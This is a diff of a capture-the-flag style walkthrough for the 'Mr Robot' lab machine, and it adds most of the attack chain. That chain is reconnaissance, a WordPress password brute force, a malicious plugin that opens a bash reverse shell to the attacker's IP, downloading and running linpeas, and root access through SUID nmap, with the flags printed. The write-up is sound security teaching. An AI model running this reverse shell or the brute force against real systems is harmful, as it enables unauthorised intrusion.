@@ -29,12 +29,12 @@ __Target IP address: 192.168.56.134__
 
 ### Nmap scan
 
-TCP Scan
+Lets start our recon with a nmap TCP SYN fast (-T4) aggressive (-A) profile scan and set the output to be very verbose (-vv) and scan all ports (-p-) and output to all nmap formats (-oA) with the output filename of tcp_agg_all.
 ```
 sudo nmap -T4 -A -vv -p- -oA tcp_agg_all 192.168.56.134
 ```
 
-UDP Scan
+You can conduct a default UDP version scan of the top 1000 UDP ports if you wish with the command below.
 ```
 sudo nmap -sUVC -vv -p- -oA upd_top_1000 192.168.56.134
 ```
@@ -95,8 +95,6 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Thu Aug 27 12:19:57 2020 -- 1 IP address (1 host up) scanned in 107.57 seconds
 ```
 
-#### UDP Scan Results
-
 ## Enumeration
 
 There are only two ports open on this machine ports 80 HTTP and 443 HTTPS running on an Apache web server.
@@ -147,9 +145,16 @@ Checking out the main website we are greeted by what looks to be like a terminal
 Doing a bit of further manual enumeration its always good practice to check the `robots.txt` file. We find two interesting entries to an `fsocity.dic` file and the first flag/key `key-1-of-3.txt` file.
 > 073403c8a58a1f80d943455fb30724b9
 
+![Website Enumeration](\assets\images\vh_mr_robot\mr_robot_web_1.jpg)
 
-The `fsocity.dic` file contains 858160 lines of random words and numbers. We could potentially use this file as passwords in a brute force attack against the wordpress login.
-We can shorten our attack time be sorting the contents within the file and just grabbing unique entries with the command below
+> The robots exclusion standard, also known as the robots exclusion protocol or simply robots.txt, is a standard used by websites to communicate with web crawlers and other web robots. The standard specifies how to inform the web robot about which areas of the website should not be processed or scanned. 
+
+[Source](https://en.wikipedia.org/wiki/Robots_exclusion_standard)
+
+
+The `fsocity.dic` file contains 858160 lines of random words and numbers. We could potentially use this files contents as passwords in a brute force attack against the wordpress login.
+
+We can shorten our attack time be sorting the contents within the file and just grabbing unique entries with the command below.
 ```
 # You can check the number of lines in a file with wc
 wc -l fsocity.dic
@@ -158,9 +163,9 @@ wc -l fsocity.dic
 sort -u fsocity.dic >> fsocity.dic.sorted
 ```
 
-If you check the number of lines now for the sorted file we have 11451 lines which is way shorter and will increase the efficiency of our brute force attack.
+If you check the number of lines now for the sorted file we have 11451 lines down from 858160 which is way smaller and will increase the efficiency of our brute force attack.
 
-We need to find a valid username for wordpress.
+We need to find a valid username for wordpress before we proceed with the brute force attack.
 
 Lets use wpscan to further enumerate the wordpress site to help us try find a username and also scan for any vulnerable wordpress plugins.
 
@@ -178,7 +183,9 @@ sudo wpscan --url 192.168.56.134 -e ap --plugins-detection aggressive --api-toke
 ```
 
 The user enumeration scan did not pick up anything this time. We can however utilize the wp-login.php pages error messages to help use enumerate a correct username.
-Notice the different Error messages in the screenshot below. It helps us to deduce the `elliot` is a correct username. If you wondering how we found elliot it involves a bit of  open-source intelligence (OSNIT) gathering using google to ask who is Mr. Robot? If you are a fan of the show you will know that Mr. Robot is a construct within Elliot Alderson's mind.
+Notice the different Error messages in the screenshot below. It helps us to deduce the `elliot` is a correct username. 
+
+If you wondering how we found elliot it was an educated guess and involves a bit of open-source intelligence (OSNIT) gathering using google to ask who is Mr. Robot? If you are a fan of the show you will know that Mr. Robot is a construct within Elliot Alderson's mind.
 
 ![Wordpress user enumeration](\assets\images\vh_mr_robot\mr_robot_wordpress_user_enum_1.jpg)
 
@@ -187,9 +194,128 @@ Now that we have found a valid username and have a relatively small wordlist we 
 sudo wpscan --url 192.168.56.134 --usernames elliot --passwords fsocity.dic.sorted --max-threads 50
 ```
 
+Once we have access to the wordpress backend we can abuse the Plugins functionality to upload a simple php/bash reverse shell plugin.
+
+Insert the following reverse shell plugin code into a file, change the IP address to your attacking machine and then zip the file.
+```php
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Wordpress Reverse Shell Plugin
+* Version: 1.0
+* Author: Zero
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/1337 0>&1'");
+?>
+```
+
+![Wordpress Plugin Upload](\assets\images\vh_mr_robot\mr_robot_wordpress_rev_shell_upload_1.jpg)
+
+Open a netcat listener on port 1337 and then click on *Activate Plugin* to receive the reverse shell.
+```
+sudo nc -nvlp 1337
+```
+
+![Wordpress Reverse Shell](\assets\images\vh_mr_robot\mr_robot_rev_shell_upload.jpg)
+
+Now that we have a shell on the system lets see if we can elevate our privileges to get root access. 
 
 ## Privilege Escalation
+
+We obtained initial access as the `daemon` user. Lets navigate to the /home directory and see what user files we can find there. There is a robot user folder so we check inside to see what we can find there. There are 2 files of interest but we can only read the one named `password.raw-md` that seems to contain a username and what looks like an md5 hash.
+
+We can crack the md5 hash using a free online hash cracker site like [crackstation.net](https://crackstation.net/)
+
+![Cracking MD5 Hash](\assets\images\vh_mr_robot\mr_robot_priv_esc_robot.jpg)
+
+Once we have cracked the MD5 hash we can try to change user to `robot` using the cracked password of `abcdefghijklmnopqrstuvwxyz`
+
+```bash
+su robot
+```
+
+We now have the permissions to read the 2nd flag/key located in the /home/robot/ directory.
+
+```
+cat /home/robot/key-2-of-3.txt
+```
+
+> 822c73956184f694993bede3eb39f959
+
+Now lets see if we can get the root access. Lets download the Linux local Privilege Escalation Awesome Script onto the machine and use that to find privilege escalation vectors.
+
+Host the file on your attacking machine using a simple python http server and serve it to the victim via http and download with wget.
+```bash
+# Start python web server where your linpeas.sh script is located.
+sudo python3 -m http.server 80
+
+# On the victim machine download the file using wget from your attacking machines IP address
+wget 192.168.56.102/linpeas.sh
+
+# Change the permissions on the file to be able to execute it.
+chmod +x linpeas.sh
+
+# Now execute the script with all tests (-a) and output to a file for later analyses if need be
+./linpeas.sh -a | tee linpeas_robot.txt
+```
+
+![Linpeas Script](\assets\images\vh_mr_robot\mr_robot_priv_esc_linpeas_1.jpg)
+
+The linpeas script highlights that the systems kernel version is a 99% Privilege Escalation vector
+> Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10
+
+It also highlights that nmap binary has its SUID bit set, this is another possible privilege escalation vector that is less intrusive than a kernel exploit which poses a risk of crashing the system! So we will try exploit this SUID bit to gain root access.
+
+![Linpeas SUID]\assets\images\vh_mr_robot\(mr_robot_priv_esc_linpeas_2.jpg)
+
+The following find command will find all files that have the SUID bit set.
+```
+find / -user root -perm -4000 -print 2>/dev/null
+```
+
+Nmap has the ability to spawn an interactive shell so lets try that to get root access.
+
+*! Tip - [GTFOBins](http://gtfobins.github.io/gtfobins/nmap/) is a great resource of a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+
+Execute the following commands to get root access!
+```
+nmap --interactive
+
+# Once within nmap execute sh
+!sh
+
+# Check your permissions with the id command
+id
+```
+
+You will notice that the effective user id is set to root: `euid=0(root)`
+
+![Root Access via SUID](\assets\images\vh_mr_robot\mr_robot_priv_esc_root.jpg)
+
+```
+cat /root/key-3-of-3.txt
+```
+
+> 04787ddef27c3dee1ee161b21670b4e4
+
+We have gained root access and obtained the last flag/key thus completing the hack on this box!
+
 ## Summary
 
-## Notes
+This was a fun easy box that involved a bit of enumeration to find the pieces of information need to gain access and then escalate our privileges from daemon to robot to root.
+We could have simply used a Kernel exploit to jump from daemon to root but kernel exploits are considered inherently risky and should be considered as a last resort.
+
+If you have not watched the show Mr Robot, I highly recommend it as it displays the most accurate depiction of hacking and the ideas explored in the show are revolutionary!
+
+Thanks for reading this write-up and hopefully you learned something.
+
+Goodbye friend.
+
 ## References
+
+[Mr Robot Wikipedia Page](https://en.wikipedia.org/wiki/Mr._Robot)
+
+![fsociety](\assets\images\vh_mr_robot\fsociety.png)
